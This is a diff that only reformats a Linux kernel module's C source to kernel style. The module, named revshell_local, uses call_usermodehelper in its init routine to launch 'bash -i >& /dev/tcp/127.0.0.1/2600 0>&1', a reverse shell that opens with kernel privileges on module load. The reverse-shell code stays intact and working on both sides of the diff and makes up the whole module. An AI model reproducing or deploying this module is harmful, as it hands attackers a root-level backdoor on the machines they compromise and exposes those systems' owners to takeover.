@@ -19,32 +19,37 @@
 
 void revshell_local(void);
 
-void revshell_local(void) {
-    char *argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/2600 0>&1 &", NULL};
-    char *env[] = {"HOME=/", "TERM=xterm-256color", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL};
+void revshell_local(void)
+{
+	char *argv[] = { "/bin/bash", "-c",
+			 "bash -i >& /dev/tcp/127.0.0.1/2600 0>&1 &", NULL };
+	char *env[] = { "HOME=/", "TERM=xterm-256color",
+			"PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
 
-    dbg_print("Launching reverse shell\n");
+	dbg_print("Launching reverse shell\n");
 
-    int ret = call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
-    if (ret < 0)
-    {
-        printk(KERN_ERR "Failed to execute reverse shell command, error: %d\n", ret);
-    } else
-    {
-        dbg_print("Reverse shell command executed successfully\n");
-    }
+	int ret = call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+	if (ret < 0) {
+		printk(KERN_ERR
+		       "Failed to execute reverse shell command, error: %d\n",
+		       ret);
+	} else {
+		dbg_print("Reverse shell command executed successfully\n");
+	}
 }
 
-static int __init revshell_local_init(void) {
-    dbg_print("revshell_local init successfully\n");
+static int __init revshell_local_init(void)
+{
+	dbg_print("revshell_local init successfully\n");
 
-    revshell_local();
+	revshell_local();
 
-    return 0;
+	return 0;
 }
 
-static void __exit revshell_local_exit(void) {
-    dbg_print("revshell_local exit successfully\n");
+static void __exit revshell_local_exit(void)
+{
+	dbg_print("revshell_local exit successfully\n");
 }
 
 module_init(revshell_local_init);
